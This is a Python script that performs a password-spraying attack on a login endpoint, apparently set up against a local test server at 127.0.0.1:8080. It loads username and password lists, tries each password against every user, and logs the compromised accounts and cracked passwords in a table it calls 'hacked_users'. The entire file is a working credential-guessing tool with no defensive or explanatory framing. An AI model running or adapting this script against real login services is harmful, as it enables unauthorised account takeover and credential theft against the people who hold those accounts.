import requests
import time
import os
import sys

# ============================================================
#                        Configuration
# ============================================================

URL = "http://127.0.0.1:8080/login"
USERS_FILE = "users.txt"
PASSWORDS_FILE = "passwords.txt"
LOG_FILE = "log.txt"

# ============================================================
#                        Global State
# ============================================================

hacked_users = {}
start_time = time.time()
session = requests.Session()


# ============================================================
#                        Helper Functions
# ============================================================

def create_log_file():
    """Create log file with header."""
    try:
        with open(LOG_FILE, "w") as f:
            f.write(f"{'Username':<40} {'Password':<40} {'Time (s)':<40}\n")
            f.write("-" * 120 + "\n")
    except Exception as e:
        print(f"[ERROR] Failed to create log file: {e}")
        sys.exit(1)


def try_login(username, password):
    """Attempt login, update hacked_users + log on success."""
    payload = {
        "username": username,
        "password": password
    }

    try:
        response = session.post(URL, json=payload, timeout=5)

    except requests.exceptions.Timeout:
        print(f"[TIMEOUT] Server did not respond for user {username}. Retrying later.")
        return
    except requests.exceptions.ConnectionError:
        raise Exception("Could not connect to server.")
    except Exception as e:
        print(f"[ERROR] Unexpected error during login for {username}: {e}")
        return

    # SUCCESS case
    if response.status_code == 200:
        elapsed = time.time() - start_time
        hacked_users[username] = (password, elapsed)

        try:
            with open(LOG_FILE, "a") as f:
                f.write(f"{username:<40} {password:<40} {elapsed:<40.2f}\n")
        except Exception as e:
            print(f"[ERROR] Failed writing to log file: {e}")


def load_file(path):
    """Load file into list of stripped lines."""
    if not os.path.exists(path):
        print(f"[ERROR] File not found: {path}")
        sys.exit(1)

    try:
        with open(path) as f:
            data = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[ERROR] Failed reading file {path}: {e}")
        sys.exit(1)

    if not data:
        print(f"[ERROR] File {path} is empty.")
        sys.exit(1)

    return data


def password_spray(users, passwords):
    """Perform password spraying attack."""
    for password in passwords:
        for username in users:
            if username not in hacked_users:
                try_login(username, password)


def print_results():
    """Print hacked users in clean table format."""
    print(f"\n{'Username':<40} {'Password':<40} {'Time (s)':<40}")
    print("-" * 120)

    for username, (password, t) in hacked_users.items():
        print(f"{username:<40} {password:<40} {t:<40.2f}")


# ============================================================
#                        Main Logic
# ============================================================

def spraying_attack():
    users = load_file(USERS_FILE)
    passwords = load_file(PASSWORDS_FILE)

    password_spray(users, passwords)
    print_results()


def main():
    create_log_file()
    spraying_attack()


# ============================================================
#                        Entry Point
# ============================================================

if __name__ == "__main__":
    main()
